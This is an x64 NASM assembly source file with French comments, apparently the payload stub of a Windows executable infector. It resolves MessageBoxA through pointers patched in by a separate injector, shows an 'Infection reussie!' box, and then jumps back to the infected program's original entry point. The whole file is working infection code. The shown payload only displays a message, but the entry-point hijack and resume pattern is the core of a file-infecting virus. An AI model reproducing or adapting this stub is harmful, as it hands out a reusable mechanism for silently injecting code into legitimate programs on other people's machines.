;--------------------------------------------------------------------
; payload.asm  –  Stub autonome x64  (flat-binary, NASM)
; Affiche « Infection reussie! » puis rend la main au programme légitime.
; Les 4 derniers dq sont patchés par l’injecteur (voir tableau plus bas).
;--------------------------------------------------------------------
bits 64
default rel
section .text
global _start

_start:
    ; ---------------- Sauvegarde contexte minimal --------------------------
    pushfq                         ; flags
    push    r9
    push    r8
    push    rdx
    push    rcx                    ; 5 × 8  = 40 o

    sub     rsp, 0x20              ; shadow space pour Win-ABI (total –72 o)
    ; À ce stade (RSP + 8) % 16 == 0  ✅

    ; ---------------- Résolution dynamique -------------------------------
    ; hUser32 = LoadLibraryA("user32.dll")
    lea     rcx,  [rel user32_str]
    mov     rax,  [rel ptr_LoadLibraryA]
    call    rax                    

    ; pMsgBox = GetProcAddress(hUser32,"MessageBoxA")
    mov     rcx,  rax
    lea     rdx,  [rel msgbox_str]
    mov     rax,  [rel ptr_GetProcAddress]
    call    rax                    

    ; MessageBoxA(NULL, txt, tit, MB_OK)
    xor     rcx, rcx
    lea     rdx,  [rel txt]
    lea     r8,   [rel tit]
    xor     r9,  r9
    call    rax                    

    ; ---------------- Restaure contexte & saute à l’OEP -------------------
    add     rsp, 0x20
    pop     rcx
    pop     rdx
    pop     r8
    pop     r9
    popfq

    mov     rax,  [rel original_oep]
    jmp     rax

; -------------------------------------------------------------------------
; Données
; -------------------------------------------------------------------------
tit            db "Yharnam",0
txt            db "Infection reussie!",0
user32_str     db "user32.dll",0
msgbox_str     db "MessageBoxA",0

align 8
ptr_LoadLibraryA    dq 0      ; patchés par injector.exe
ptr_GetProcAddress  dq 0
ptr_MessageBoxA     dq 0      ; (non utilisé finalement, mais dispo si besoin)
original_oep        dq 0
